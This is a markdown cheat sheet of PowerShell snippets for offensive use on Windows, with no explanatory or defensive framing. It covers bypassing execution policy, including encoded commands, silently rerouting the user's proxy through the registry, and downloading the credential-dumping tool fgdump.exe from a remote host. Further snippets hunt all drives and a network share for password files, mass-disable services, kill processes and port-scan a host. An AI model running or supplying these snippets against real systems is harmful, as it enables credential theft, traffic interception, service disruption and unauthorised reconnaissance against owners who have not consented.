## PowerShell snippets

### Output
```powershell
| %{write-host $_}
| Out-File -Encoding Ascii out.txt
| Format-Table -Wrap
| select SamAccountName, Name, useraccountcontrol,
```

### Import
```powershell
Import-Module â€“Name C:\myRandomDirectory\myModule
```

### Execution Bypass
```powershell
Set-ExecutionPolicy Bypass -Scope Process
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
powershell -ExecutionPolicy ByPass -File script.ps1
powershell.exe -ExecutionPolicy Bypass -C command
powershell.exe -ExecutionPolicy Bypass -EncodedCommand Base64EncodedCommand
```

### Change proxy
```powershell
#Change this to whatever proxy you want to use
$newProxy = "http://localhost:8080"

$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"

Set-ItemProperty -Path $path -Name "MigrateProxy" -Value 00000001
Set-ItemProperty -Path $path -Name "ProxyEnable" -Value 00000001
Set-ItemProperty -Path $path -Name "ProxyHttp1.1" -Value 00000000
Set-ItemProperty -Path $path -Name "ProxyServer" -Value $newProxy
Set-ItemProperty -Path $path -Name "ProxyOverride" -Value "<local>"

#Hex array with several configurations, but just want to change the 9th value
$a = (Get-ItemProperty -Path ($path+"Connections\") -Name DefaultConnectionSettings).DefaultConnectionSettings
$a[8] = 3
$a[8] = 29 #to revert

Set-ItemProperty -Path ($path+"Connections\") -Name DefaultConnectionSettings -Value $a
```

### Download file
```powershell
$url = "http://192.168.0.200"
$client = new-object System.Net.WebClient
$client.DownloadFile(($url+"/fgdump.exe"), "fgdump.exe")
```
### Search for files with "pass"
```powershell
$ErrorActionPreference = "SilentlyContinue"

Get-PSDrive -PSProvider 'FileSystem' | ForEach-Object {
    $directory = $_
    Write-Output "Looking for files in $($directory.Root) ($($directory.Description))"

    # Searching files that contain the string "pass"
    Get-ChildItem $directory.Root -Recurse | Where-Object { !$_PSIsContainer } | ForEach-Object { Select-String -path $_.FullName -pattern "password" -SimpleMatch -List } | ForEach-Object { $_.path }

    # Searching for files or directories with "pass" in the filename
    Get-ChildItem $directory.Root -Recurse -Include "*pass*" | ForEach-Object {$_.FullName} # Used to find files with password in the filename
}

@("\\some.ip.add.ress\network_share$") | ForEach-Object {
    Write-Output "Looking for files in $($_) "

    # Searching files that contain the string "pass"
    Get-ChildItem $_ -Recurse | Where-Object { !$_PSIsContainer } | ForEach-Object { Select-String -path $_.FullName -pattern "password" -SimpleMatch -List } | ForEach-Object { $_.path }

    # Searching for files or directories with "pass" in the filename
    Get-ChildItem $_ -Recurse -Include "*pass*" | ForEach-Object {$_.FullName} # Used to find files with password in the filename
}
```

### Mess with services/processes
```powershell
Get-Service -name "m*" | Set-Service -StartupType "disabled"

Stop-Process -force -name name*,any*,etc

```

### Port scan
```powershell
$ErrorActionPreference = "SilentlyContinue" # careful with this
$ports = 1..10000
$ip = "10.1.1.1"

foreach ($port in $ports) {
    if(Test-Connection -BufferSize 32 -Count 1 -Quiet -ComputerName $ip) {
        $socket = new-object System.Net.Sockets.TcpClient($ip, $port)
        If($socket.Connected) {
            "$ip listening to port $port"
            $socket.Close()
        }
    }
}
```

```powershell

$socket = new-object System.Net.Sockets.TcpClient("10.1.1.1", 445)
If($socket.Connected) {
    "$ip listening to port $port"
    $socket.Close()
}
```